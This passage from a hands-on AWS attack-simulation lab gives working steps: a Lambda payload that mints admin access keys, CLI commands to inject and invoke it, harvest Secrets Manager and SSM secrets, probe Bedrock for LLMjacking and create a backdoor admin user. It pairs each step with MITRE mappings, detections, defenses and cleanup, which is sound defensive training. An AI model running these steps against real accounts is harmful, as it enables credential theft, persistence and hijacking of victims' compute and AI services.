    (AdministratorAccess). It:
    1. Confirms its identity (to verify admin access)
    2. Lists all IAM users and their permissions
    3. Creates new access keys for the admin user 'frick'
    4. Lists S3 buckets (for additional reconnaissance)
    5. Returns all results in the function response
    """
    results = {}

    # Step 1: Confirm identity -- verify we have the admin role
    sts = boto3.client("sts")
    results["identity"] = sts.get_caller_identity()["Arn"]

    # Step 2: Enumerate IAM users and their permissions
    iam = boto3.client("iam")
    try:
        users = iam.list_users()
        results["users"] = {}
        for user in users["Users"]:
            uname = user["UserName"]
            try:
                keys = iam.list_access_keys(UserName=uname)
                policies = iam.list_attached_user_policies(UserName=uname)
                groups = iam.list_groups_for_user(UserName=uname)
                results["users"][uname] = {
                    "access_key_count": len(keys["AccessKeyMetadata"]),
                    "policies": [p["PolicyName"] for p in policies["AttachedPolicies"]],
                    "groups": [g["GroupName"] for g in groups["Groups"]],
                }
            except Exception as e:
                results["users"][uname] = str(e)
    except Exception as e:
        results["users_error"] = str(e)

    # Step 3: Create new access keys for the admin user
    try:
        new_key = iam.create_access_key(UserName="frick")
        results["admin_credentials"] = {
            "AccessKeyId": new_key["AccessKey"]["AccessKeyId"],
            "SecretAccessKey": new_key["AccessKey"]["SecretAccessKey"],
        }
    except Exception as e:
        results["key_creation_error"] = str(e)

    # Step 4: List S3 buckets for additional recon
    s3 = boto3.client("s3")
    try:
        buckets = s3.list_buckets()
        results["buckets"] = [b["Name"] for b in buckets["Buckets"][:10]]
    except Exception as e:
        results["s3_error"] = str(e)

    return {"statusCode": 200, "body": json.dumps(results, default=str)}
PAYLOAD
```

### Step 6c: Package the Malicious Code as a Zip

Lambda requires code to be uploaded as a zip file. The zip must contain a Python file with a handler function.

```bash
# Create the zip file
# The -j flag strips directory paths (so the file is at the root of the zip)
cd /tmp && zip -j ec2_init.zip ec2_init.py
```

**Flag breakdown:**
- `zip` -- Create a zip archive
- `-j` -- Junk (strip) directory paths; store files at the root of the archive
- `ec2_init.zip` -- Output filename
- `ec2_init.py` -- Input file to compress

### Step 6d: Inject the Malicious Code into the Lambda Function

```bash
# Wait for the configuration update to complete (from Step 6a)
aws lambda wait function-updated --function-name EC2-init --profile attacker

# Replace the function code with our malicious payload
aws lambda update-function-code \
  --function-name EC2-init \
  --zip-file fileb:///tmp/ec2_init.zip \
  --profile attacker
```

**Flag breakdown:**
- `update-function-code` -- Replace a Lambda function's code
- `--function-name EC2-init` -- Target function
- `--zip-file fileb:///tmp/malicious_lambda.zip` -- The code package. The `fileb://` prefix tells the CLI to read the file as binary data and base64-encode it for the API call
- `--profile attacker` -- Use the stolen credentials

**Expected output:** JSON showing the updated function with a new `CodeSha256` hash.


### What Just Happened

You made two API calls:
1. `UpdateFunctionConfiguration` -- Changed timeout from 3 to 30 seconds
2. `UpdateFunctionCode20150331v2` -- Replaced the function's code with your payload. The CLI base64-encoded your zip file and sent it via HTTPS PUT

The original `ec2_init.py` code is gone. It has been replaced by your malicious `ec2_init.py`. Because we named our file identically, the handler `ec2_init.lambda_handler` still resolves -- no configuration change needed. The function still has its `EC2-init-lambda-execution-role` with `AdministratorAccess` -- your code will run with those permissions.

The two calls are logged in CloudTrail.

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Serverless Execution | **T1648** | Execution |
| Event Triggered Execution | **T1546** | Privilege Escalation |

T1648 specifically references Lambda `UpdateFunctionCode` as a technique for adversaries to "abuse serverless execution resources."

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | UpdateFunctionCode called on Lambda by non-CI/CD identity | **Critical** |
| **CDR** | UpdateFunctionConfiguration increased timeout significantly | **High** |
| **CWP** | Lambda function code modified outside deployment pipeline | **Critical** |

### Defense

1. **Enable Lambda code signing** -- Blocks `UpdateFunctionCode` with unsigned code
2. **Restrict `lambda:UpdateFunctionCode`** to CI/CD roles only via SCP
3. **Alert on `UpdateFunctionCode` events** in CloudTrail
4. **Apply least-privilege** to Lambda execution roles (this function only needs `ec2:CreateTags`)

---

## STEP 7: Invoke Lambda -- Harvest Admin Credentials

### Context (Attacker Mindset)

The malicious code is deployed. Now you invoke the function. When Lambda runs your code, it uses the admin execution role's credentials. Your code creates a new access key for user `frick` and returns it in the response. You read the response and obtain admin credentials.

### Commands

```bash
# Wait for the code update to complete
aws lambda wait function-updated --function-name EC2-init --profile attacker

# Invoke the function and capture the response
aws lambda invoke \
  --function-name EC2-init \
  --payload '{}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/lambda_output.json \
  --profile attacker

# Display the response
echo "=== Lambda Response ==="
cat /tmp/lambda_output.json | python3 -m json.tool
```

**Flag breakdown:**
- `lambda invoke` -- Synchronously invoke a Lambda function
- `--function-name EC2-init` -- The function to invoke
- `--payload '{}'` -- Input event (empty JSON; our code does not use the event)
- `--cli-binary-format raw-in-base64-out` -- Tells CLI to send the payload as-is (not base64-encode it)
- `/tmp/lambda_output.json` -- File to write the function's return value to
- `--profile attacker` -- Use the stolen credentials

**Expected output (lambda_output.json):**

```json
{
    "statusCode": 200,
    "body": "{\"identity\": \"arn:aws:iam::XXXXXXXXXXXX:role/EC2-init-lambda-execution-role\", \"users\": {\"frick\": {\"access_key_count\": 1, \"policies\": [\"AdministratorAccess\"], \"groups\": []}, ...}, \"admin_credentials\": {\"AccessKeyId\": \"AKIA...\", \"SecretAccessKey\": \"...\"}}"
}
```

The `body` field is a JSON string. Parse it to extract the admin credentials:

```bash
# Extract the admin credentials from the Lambda response
ADMIN_CREDS=$(cat /tmp/lambda_output.json | python3 -c "import sys,json; d=json.load(sys.stdin); b=json.loads(d['body']); print(json.dumps(b.get('admin_credentials',{})))")

echo "=== ADMIN CREDENTIALS OBTAINED ==="
echo "${ADMIN_CREDS}" | python3 -m json.tool

# Save them for use in subsequent steps
ADMIN_KEY_ID=$(echo "${ADMIN_CREDS}" | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
ADMIN_SECRET=$(echo "${ADMIN_CREDS}" | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretAccessKey'])")

# Configure an admin attacker profile
aws configure set aws_access_key_id "${ADMIN_KEY_ID}" --profile attacker-admin
aws configure set aws_secret_access_key "${ADMIN_SECRET}" --profile attacker-admin
aws configure set region "${ATTACKER_REGION}" --profile attacker-admin
```

### What Just Happened

This is the moment the attacker achieves admin access. Behind the scenes:

1. Your `lambda invoke` call triggered Lambda to start a new execution environment
2. Lambda called `sts:AssumeRole` on `EC2-init-lambda-execution-role`, getting temporary admin credentials
3. Lambda injected those credentials as environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`)
4. Your malicious code used those admin credentials via boto3 to call `iam:CreateAccessKey` for user `frick`
5. AWS created a new, permanent access key pair for `frick`
6. The credentials were returned in the Lambda response

You now have permanent (non-expiring) admin access keys. Even if the Lambda function is fixed, your keys remain valid until explicitly deleted or deactivated.

**In the real attack, this entire sequence -- from initial access to admin -- took approximately 8 minutes.**

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Account Manipulation: Additional Cloud Credentials | **T1098.001** | Persistence |

T1098.001 specifically describes `CreateAccessKey` and cites the SCARLETEEL 2.0 campaign.

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | CreateAccessKey called for admin user from Lambda execution role | **Critical** |
| **CDR** | New access key created for IAM user with AdministratorAccess | **Critical** |
| **CIEM** | IAM user has more than 1 active access key | **Medium** |

---

## STEP 8: Verify Admin Access

### Commands

```bash
# Verify the admin credentials work
aws sts get-caller-identity --profile attacker-admin
```

**Expected output:**
```json
{
    "UserId": "AIDA...",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/admins/frick"
}
```

You are now `frick` -- a user with `AdministratorAccess`. You can do anything in this AWS account.

```bash
# Prove it: try an action that requires admin
aws iam list-account-aliases --profile attacker-admin
aws organizations describe-organization --profile attacker-admin 2>/dev/null || echo "(No organization configured)"
```

---

## STEP 9: Secret Harvesting -- Secrets Manager

### Context (Attacker Mindset)

With admin access, the first target is secrets. Secrets Manager and SSM Parameter Store are where organizations keep database passwords, API keys, encryption keys, and other high-value credentials. In the real attack, the attacker harvested secrets from both services plus CloudWatch Logs.

### Concept: AWS Secrets Manager

**Secrets Manager** stores, rotates, and manages access to secrets (database credentials, API keys, tokens). Secrets are encrypted at rest using KMS. Access is controlled by IAM policies and optional resource-based policies on individual secrets.

With admin access, you can call `GetSecretValue` on any secret. This returns the plaintext secret.

### Commands

```bash
# List all secrets
aws secretsmanager list-secrets --profile attacker-admin --query 'SecretList[].{Name:Name,Description:Description}' --output table

# Harvest each secret
echo "=== DATABASE CREDENTIALS ==="
aws secretsmanager get-secret-value --secret-id "prod/database/postgres-main" --profile attacker-admin --query 'SecretString' --output text | python3 -m json.tool

echo ""
echo "=== STRIPE API KEY ==="
aws secretsmanager get-secret-value --secret-id "prod/api/stripe-secret-key" --profile attacker-admin --query 'SecretString' --output text

echo ""
echo "=== SENDGRID API KEY ==="
aws secretsmanager get-secret-value --secret-id "prod/api/sendgrid-api-key" --profile attacker-admin --query 'SecretString' --output text
```

**Flag breakdown:**
- `get-secret-value` -- Retrieves the current value of a secret
- `--secret-id` -- Name or ARN of the secret
- `--query 'SecretString'` -- JMESPath query to extract only the secret value (not metadata)
- `--output text` -- Output as plain text (not JSON-wrapped)

**Expected output:** The plaintext values of all three secrets, including the simulated database credentials, Stripe API key, and SendGrid API key.

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Cloud Secrets Management Stores | **T1555.006** | Credential Access |

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | GetSecretValue called by admin user from unusual IP | **High** |
| **DSPM** | Bulk access to secrets containing database credentials and API keys | **Critical** |

---

## STEP 10: Secret Harvesting -- SSM Parameter Store

### Concept: SSM Parameter Store

**Systems Manager Parameter Store** provides secure storage for configuration data and secrets. It supports two types:
- `String` / `StringList` -- Plaintext (free, unlimited)
- `SecureString` -- Encrypted with KMS (free for standard tier, up to 10,000 parameters)

Unlike Secrets Manager, Parameter Store does not have built-in rotation. Many organizations use it for secrets because it is free.

### Commands

```bash
# List parameters
aws ssm describe-parameters --profile attacker-admin --query 'Parameters[].{Name:Name,Type:Type}' --output table

# Harvest SecureString parameters (KMS decryption happens automatically with admin access)
echo "=== DATABASE CONNECTION STRING ==="
aws ssm get-parameter --name "/prod/database/connection-string" --with-decryption --profile attacker-admin --query 'Parameter.Value' --output text

echo ""
echo "=== JWT SECRET ==="
aws ssm get-parameter --name "/prod/app/jwt-secret" --with-decryption --profile attacker-admin --query 'Parameter.Value' --output text

echo ""
echo "=== ENCRYPTION KEY ==="
aws ssm get-parameter --name "/prod/app/encryption-key" --with-decryption --profile attacker-admin --query 'Parameter.Value' --output text
```

**Flag breakdown:**
- `get-parameter` -- Retrieves a parameter value
- `--name` -- The parameter path
- `--with-decryption` -- Decrypts SecureString parameters using KMS. Without this flag, SecureString values are returned as encrypted ciphertext

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Unsecured Credentials: Cloud Secrets Mgmt Stores | **T1555.006** | Credential Access |

---

## STEP 11: LLMjacking Reconnaissance (Bedrock)

### Context (Attacker Mindset)

In the real attack, after gaining admin access, the attacker checked whether Bedrock model invocation logging was enabled. When it was disabled, they proceeded to invoke multiple models across different providers -- a technique called **LLMjacking** (abusing someone else's cloud-hosted AI models at their expense).

### Concept: LLMjacking

**LLMjacking** is the unauthorized use of cloud-hosted AI models. Attackers steal cloud credentials and use them to invoke expensive AI models (like Claude, GPT-4, etc.) at the victim's expense. First documented by Sysdig TRT in May 2024, costs can reach $46,000/day.

### Commands

```bash
# Check if Bedrock model invocation logging is enabled
# In the real attack, the attacker confirmed logging was DISABLED before proceeding
aws bedrock get-model-invocation-logging-configuration --profile attacker-admin 2>/dev/null

# List available foundation models
aws bedrock list-foundation-models --profile attacker-admin \
  --query 'modelSummaries[?providerName==`Anthropic` || providerName==`Amazon` || providerName==`Meta`].{Provider:providerName,Model:modelId}' \
  --output table 2>/dev/null | head -20

# List inference profiles (used for cross-region inference)
aws bedrock list-inference-profiles --profile attacker-admin \
  --query 'inferenceProfileSummaries[].{Name:inferenceProfileName,Id:inferenceProfileId}' \
  --output table 2>/dev/null | head -10
```

**Expected output for logging check:**
```json
{
    "loggingConfig": null
}
```

If `loggingConfig` is `null` or returns an error, logging is not configured. The attacker can invoke models without the victim seeing which prompts were sent.

> **NOTE:** Actually invoking Bedrock models requires model access to be enabled in the AWS Console (a one-time manual action per model). In a lab setting, you may not have this configured. The reconnaissance commands above work regardless.
>
> If you DO have Bedrock models enabled and want to test invocation, use the cheapest model:
> ```bash
> aws bedrock-runtime invoke-model \
>   --model-id amazon.nova-micro-v1:0 \
>   --body '{"messages":[{"role":"user","content":[{"text":"Say hello in 5 words"}]}]}' \
>   --content-type application/json \
>   --accept application/json \
>   /tmp/bedrock_output.json \
>   --profile attacker-admin 2>/dev/null && cat /tmp/bedrock_output.json | python3 -m json.tool
> ```

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Resource Hijacking: Cloud Service Hijacking | **T1496.004** | Impact |

T1496.004 was created specifically for LLMjacking and cites Sysdig's research.

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | Bedrock model invocations from admin user at unusual volume | **High** |
| **CDR** | GetModelInvocationLoggingConfiguration recon by compromised user | **Medium** |
| **CSPM** | Bedrock model invocation logging is not enabled | **Medium** |

---

## STEP 12: GPU Instance Reconnaissance (Dry Run)

### Context (Attacker Mindset)

The real attacker attempted to launch GPU instances for AI model training. They searched for Deep Learning AMIs, created a key pair called `stevan-gpu-key`, and tried to launch `p5.48xlarge` instances (cost: ~$98/hour). When those failed due to capacity limits, they launched a `p4d.24xlarge` at $32.77/hour.

We will simulate this with a **dry run** that does not actually launch any instances.

### Commands

```bash
# Search for Deep Learning AMIs (what the real attacker did)
aws ec2 describe-images \
  --filters "Name=name,Values=*Deep Learning*Ubuntu*" \
  --query 'Images | length(@)' \
  --profile attacker-admin

# The real attacker found 1,300+ AMIs. Let us see the most recent one:
aws ec2 describe-images \
  --filters "Name=name,Values=*Deep Learning*Ubuntu*" \
  --query 'Images | sort_by(@, &CreationDate) | [-1].{Name:Name,ImageId:ImageId,Created:CreationDate}' \
  --output table \
  --profile attacker-admin 2>/dev/null

# DRY RUN: Simulate launching a GPU instance without actually creating it
# The --dry-run flag makes AWS validate the request but not execute it
aws ec2 run-instances \
  --image-id ami-0123456789abcdef0 \
  --instance-type p4d.24xlarge \
  --dry-run \
  --profile attacker-admin 2>&1 || true
```

**Expected output for dry run:**
```
An error occurred (DryRunOperation) when calling the RunInstances operation: Request would have succeeded, but DryRun flag is set.
```

If you see `DryRunOperation`, it means the request WOULD succeed -- you have permission to launch GPU instances. If you see an error about quotas or capacity, that is also expected (most accounts have 0 quota for p4/p5 instances).

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Resource Hijacking: Compute Hijacking | **T1496.001** | Impact |
| Create Cloud Instance | **T1578.002** | Defense Evasion |

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | RunInstances for GPU instance type from unusual principal | **Critical** |
| **CSPM** | No service quota limits set for GPU instance types | **Medium** |

### Defense

- **Set EC2 service quotas** to 0 for GPU instance types (p3, p4, p5, g4, g5) unless explicitly needed
- **Use SCPs** to deny `ec2:RunInstances` for GPU types
- **Set up billing alerts** for cost anomalies

---

## STEP 13: Persistence -- Create Backdoor User

### Context (Attacker Mindset)

Your current admin access is through user `frick` -- an existing user that the real admins monitor. To maintain access even if `frick`'s keys are rotated, you create a new user with a less obvious name and give it admin access.

In the real attack, the attacker created `backdoor-admin` with `AdministratorAccess` at the 11-minute mark.

### Commands

```bash
# Create a new IAM user (the backdoor)
aws iam create-user --user-name backdoor-admin --profile attacker-admin

# Attach AdministratorAccess policy
aws iam attach-user-policy \
  --user-name backdoor-admin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile attacker-admin

# Create access keys for the backdoor user
aws iam create-access-key --user-name backdoor-admin --profile attacker-admin
```

**Expected output:**
```json
{
    "AccessKey": {
        "UserName": "backdoor-admin",
        "AccessKeyId": "AKIA...",
        "Status": "Active",
        "SecretAccessKey": "..."
    }
}
```

The attacker now has three independent paths to admin access:
1. The original `rag-pipeline-user` credentials (can re-exploit Lambda)
2. The new access keys for `frick`
3. The new access keys for `backdoor-admin`

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Account Manipulation: Additional Cloud Credentials | **T1098.001** | Persistence |
| Create Account: Cloud Account | **T1136.003** | Persistence |

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | CreateUser followed by AttachUserPolicy with AdministratorAccess | **Critical** |
| **CIEM** | New IAM user with AdministratorAccess created outside normal process | **Critical** |

---

# PART 4: CLEANUP

**IMPORTANT:** Run cleanup from your ORIGINAL admin profile (not the attacker profiles).

### Step 1: Delete the Backdoor User

```bash
# Remove the backdoor user created during the attack

# First, delete any access keys
for KEY_ID in $(aws iam list-access-keys --user-name backdoor-admin --query 'AccessKeyMetadata[].AccessKeyId' --output text 2>/dev/null); do
  aws iam delete-access-key --user-name backdoor-admin --access-key-id ${KEY_ID}
done

# Detach policies
aws iam detach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>/dev/null

# Delete the user
aws iam delete-user --user-name backdoor-admin 2>/dev/null
echo "Backdoor user deleted"
```

### Step 2: Delete Extra Access Keys for frick

The attacker created new access keys for the admin user `frick`. These need to be removed.

```bash
# List all access keys for frick
aws iam list-access-keys --user-name frick

# Delete any keys that were NOT created by Terraform.
# The Terraform-created key was the first one. Any additional keys are attacker-created.
# Replace AKIA_ATTACKER_KEY_ID with the actual key ID from the Lambda output.
# aws iam delete-access-key --user-name frick --access-key-id AKIA_ATTACKER_KEY_ID
```

### Step 3: Restore the Lambda Function

```bash
# Terraform will handle this, but you can verify the function was tampered with:
aws lambda get-function --function-name EC2-init --query 'Configuration.{Handler:Handler,Timeout:Timeout}'
# Should show handler: ec2-init.lambda_handler, Timeout: 30 (both attacker-modified)
```

### Step 4: Destroy All Terraform Infrastructure

```bash
cd terraform/
terraform destroy
```

Type `yes` when prompted. This deletes all resources created by Terraform: S3 buckets, IAM users, Lambda function, Secrets Manager secrets, SSM parameters, and CloudTrail trail.

### Step 5: Re-enable Account-Level S3 Block Public Access

```bash
aws s3control put-public-access-block \
  --account-id $(aws sts get-caller-identity --query Account --output text) \
  --public-access-block-configuration \
    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
```

### Step 6: Clean Up Attacker Profiles

```bash
# Remove the attacker profiles from your AWS CLI config
aws configure set aws_access_key_id "" --profile attacker
aws configure set aws_secret_access_key "" --profile attacker
aws configure set aws_access_key_id "" --profile attacker-admin
aws configure set aws_secret_access_key "" --profile attacker-admin
```

### Step 7: Manual Verification Checklist

Log into the AWS Console and verify:

- [ ] **IAM > Users**: No `backdoor-admin`, `rag-pipeline-user`, `frick`, or `rocker` users
- [ ] **Lambda > Functions**: No `EC2-init` function
- [ ] **S3 > Buckets**: No `acme-ai-rag-data-*` or `acme-ai-cloudtrail-*` buckets
- [ ] **Secrets Manager**: No `prod/database/postgres-main`, `prod/api/stripe-*`, or `prod/api/sendgrid-*` secrets
- [ ] **SSM Parameter Store**: No `/prod/database/*` or `/prod/app/*` parameters
- [ ] **CloudTrail**: No `acme-ai-attack-lab-trail` trail
- [ ] **EC2**: No running instances (especially GPU types)
- [ ] **IAM > Roles**: No `EC2-init-lambda-execution-role`
- [ ] **S3 Block Public Access**: Account-level BPA re-enabled (all four settings = true)

---

# PART 5: SUMMARY

## What You Learned

### Cloud Concepts Checklist

Test yourself -- can you explain each of these?

- [ ] S3 bucket policies and how `Principal: "*"` makes a bucket public
- [ ] S3 Block Public Access (account-level vs bucket-level, four settings)
- [ ] IAM users vs IAM roles vs instance profiles
- [ ] IAM policies: managed vs inline, identity-based vs resource-based
- [ ] The `ReadOnlyAccess` managed policy and why it is dangerous for service accounts
- [ ] AWS STS and `GetCallerIdentity` (requires no permissions)
- [ ] Lambda execution roles and how Lambda assumes them via STS
- [ ] `UpdateFunctionCode` as a privilege escalation path (no `iam:PassRole` needed)
- [ ] Lambda code signing as a defense against code injection
- [ ] Secrets Manager vs SSM Parameter Store
- [ ] Amazon Bedrock model access and invocation logging
- [ ] LLMjacking as a threat vector
- [ ] GPU instance types and service quotas as a cost control
- [ ] CloudTrail and how every API call is recorded
- [ ] Named AWS CLI profiles for switching between identities

### Attack Techniques Practiced

| Step | MITRE Technique | ID | What You Did |
|------|----------------|-----|-------------|
| 1 | Data from Cloud Storage | T1530 | Found credentials in public S3 bucket |
| 2 | Cloud Account Discovery | T1087.004 | Identified the compromised identity |
| 3 | Cloud Infrastructure Discovery | T1580 | Mapped 12+ AWS services |
| 4 | Valid Accounts | T1078 | Attempted (failed) role assumption |
| 6 | Serverless Execution | T1648 | Injected code into Lambda function |
| 7 | Additional Cloud Credentials | T1098.001 | Created admin access keys via Lambda |
| 9-10 | Cloud Secrets Mgmt Stores | T1555.006 | Harvested secrets from SM and SSM |
| 11 | Cloud Service Hijacking | T1496.004 | Reconnaissance for LLMjacking |
| 12 | Compute Hijacking | T1496.001 | GPU instance dry run |
| 13 | Create Cloud Account | T1136.003 | Backdoor user for persistence |

### Tools and Commands Used

- **AWS CLI v2** -- `aws s3`, `aws sts`, `aws iam`, `aws lambda`, `aws secretsmanager`, `aws ssm`, `aws bedrock`, `aws ec2`
- **Terraform** -- Infrastructure as code for deploying and destroying the lab environment
- **Python** -- For creating the malicious Lambda payload
- **jq / python3 -m json.tool** -- JSON parsing
- **zip** -- Packaging Lambda code

### CNAPP Detection Summary

| Attack Step | CNAPP Component | Alert |
|---|---|---|
| Public S3 bucket | **CSPM** | S3 bucket with public access, no BPA |
| Credentials in S3 | **DSPM** | AWS credentials detected in S3 objects |
| Burst enumeration | **CDR** | Unusual API call volume from service account |
| ReadOnlyAccess on service account | **CIEM** | Excessive permissions |
| Lambda admin execution role | **CIEM** | Lambda role with AdministratorAccess |
| No Lambda code signing | **CSPM** | Lambda function without code signing |
| UpdateFunctionCode by non-CI/CD | **CDR** | Lambda code change outside pipeline |
| CreateAccessKey for admin | **CDR** | New credentials for admin user |
| GetSecretValue burst | **CDR** + **DSPM** | Bulk secret access |
| Bedrock logging disabled | **CSPM** | Missing model invocation logging |
| GPU instance launch | **CDR** | RunInstances for expensive instance type |
| CreateUser + AdminAccess | **CDR** + **CIEM** | Backdoor user creation |

### Connections to Real-World Breaches

- **This exact attack (Sysdig TRT, Nov 2025)**: The scenario you just executed is based on a real attack observed in the wild. The attacker achieved admin access in 8 minutes using AI-generated code with Serbian-language comments.
- **SCARLETEEL 1.0 (Sysdig, Feb 2023)**: Attackers found credentials in S3 and Terraform state files, stole 1TB+ of data
- **SCARLETEEL 2.0 (Sysdig, Jul 2023)**: Exploited a policy typo for privilege escalation, deployed 42 mining instances at $4,000/day
- **First LLMjacking (Sysdig, May 2024)**: Attacker used stolen credentials to invoke Claude models at $46,000/day
- **GUI-Vil (Permiso, 2023)**: Indonesian group scanned GitHub for exposed AWS keys, launched GPU miners in 31 minutes
- **AWS cryptomining campaign (GuardDuty, Nov 2025)**: Compromised IAM credentials used to deploy miners across EC2/ECS within 10 minutes

### What Makes This Scenario Harder Than Typical Training

1. **Multi-service chaining**: The attack crosses S3, IAM, Lambda, Secrets Manager, SSM, Bedrock, and EC2 -- understanding their trust relationships is essential
2. **Indirect privilege escalation**: The attacker never assumes the admin role directly; they use Lambda as a proxy, which is harder to detect
3. **AI acceleration**: The real attacker's speed (8 minutes) means traditional detection windows do not work; you need real-time CDR
4. **Multiple impact types**: The same compromise enables data theft (secrets), service abuse (LLMjacking), and resource hijacking (GPU instances) -- showing the full blast radius of one leaked credential

---

## DETECTION MAPPING TABLES

### MITRE ATT&CK Full Mapping

| Step | Technique ID | Technique Name | Tactic | Description |
|------|-------------|----------------|--------|-------------|
| 1 | T1530 | Data from Cloud Storage | Collection | Download credentials from public S3 bucket |
| 1 | T1078.004 | Valid Accounts: Cloud Accounts | Initial Access | Use discovered AWS credentials |
| 2 | T1087.004 | Account Discovery: Cloud Account | Discovery | GetCallerIdentity to identify compromised user |
| 3 | T1580 | Cloud Infrastructure Discovery | Discovery | Enumerate Lambda, S3, IAM, Secrets Mgr, SSM |
| 3 | T1526 | Cloud Service Discovery | Discovery | List available services and configurations |
| 4 | T1078 | Valid Accounts | Defense Evasion | Attempt to assume admin roles |
| 6 | T1648 | Serverless Execution | Execution | Inject code via UpdateFunctionCode |
| 6 | T1546 | Event Triggered Execution | Priv Escalation | Lambda executes with admin role |
| 7 | T1098.001 | Additional Cloud Credentials | Persistence | CreateAccessKey for admin user |
| 9 | T1555.006 | Cloud Secrets Mgmt Stores | Credential Access | GetSecretValue on Secrets Manager |
| 10 | T1555.006 | Cloud Secrets Mgmt Stores | Credential Access | GetParameter with decryption on SSM |
| 11 | T1496.004 | Cloud Service Hijacking | Impact | Bedrock model invocation recon |
| 12 | T1496.001 | Compute Hijacking | Impact | GPU instance launch attempt |
| 13 | T1098.001 | Additional Cloud Credentials | Persistence | CreateAccessKey for backdoor user |
| 13 | T1136.003 | Create Account: Cloud Account | Persistence | CreateUser for persistence |

### CNAPP Detection Full Mapping

| Step | Component | Detection Description | Severity | What the SOC Would See |
|------|-----------|----------------------|----------|----------------------|
| 1 | CSPM | S3 bucket allows public access (BPA disabled) | Critical | Posture alert: bucket policy permits anonymous access |
| 1 | DSPM | Credentials detected in S3 object | Critical | Data scan: AWS access key pattern found in config file |
| 2 | CDR | GetCallerIdentity from external IP | Medium | Identity anomaly: service account used from non-VPC IP |
| 3 | CDR | Burst of reconnaissance API calls | High | Behavior alert: 30+ List/Describe calls in 3 minutes |
| 3 | CIEM | Service account has ReadOnlyAccess | Medium | Permission alert: overly broad read permissions |
| 4 | CDR | Failed AssumeRole attempts | High | Auth alert: multiple denied role assumptions |
| 5 | CIEM | Lambda role has AdministratorAccess | Critical | Permission alert: Lambda execution role overprivileged |
| 6 | CDR | UpdateFunctionCode by non-CI/CD identity | Critical | Runtime alert: Lambda code modified by service account |
| 6 | CDR | UpdateFunctionConfiguration: timeout increased | High | Config alert: significant timeout change |
| 6 | CSPM | Lambda has no code signing config | Medium | Posture alert: code signing not enforced |
| 7 | CDR | CreateAccessKey for admin user from Lambda | Critical | Identity alert: new credentials for admin principal |
| 9-10 | CDR | Bulk GetSecretValue/GetParameter calls | High | Data alert: mass secret retrieval |
| 11 | CSPM | Bedrock invocation logging not enabled | Medium | Posture alert: AI model usage not monitored |
| 12 | CDR | RunInstances for GPU type | Critical | Resource alert: expensive instance launch |
| 13 | CDR | CreateUser + AttachUserPolicy (AdminAccess) | Critical | Identity alert: new admin user created |
